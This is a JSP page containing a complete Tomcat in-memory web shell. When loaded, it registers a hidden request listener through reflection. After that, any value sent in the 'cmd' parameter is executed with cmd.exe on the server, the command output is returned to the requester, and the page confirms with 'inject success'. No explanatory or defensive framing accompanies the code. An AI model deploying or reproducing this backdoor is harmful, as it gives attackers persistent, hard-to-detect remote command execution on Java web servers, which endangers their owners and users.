<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.annotation.WebServlet" %>
<%@ page import="javax.servlet.http.HttpServlet" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="javax.servlet.http.HttpServletResponse" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    class S implements ServletRequestListener{
        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
            HttpServletRequest req = (HttpServletRequest)
                    sre.getServletRequest();
            if (req.getParameter("cmd") != null) {
                InputStream in = null;
                try {
                    in = Runtime.getRuntime().exec(new String[] {"cmd.exe", "/c", req.getParameter("cmd")}).getInputStream();
                    Scanner s = new Scanner(in).useDelimiter("\\A");
                    String out = s.hasNext() ? s.next() : "";
                    Field requestF =
                            req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request) requestF.get(req);
                    request.getResponse().getWriter().write(out);
                } catch (IOException e) {
                } catch (NoSuchFieldException e) {
                } catch (IllegalAccessException e) {
                }
            }
        }
        @Override
        public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        }
    }
%>

<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    S servletRequestListener = new S();
    standardContext.addApplicationEventListener(servletRequestListener);
    out.println("inject success");
%>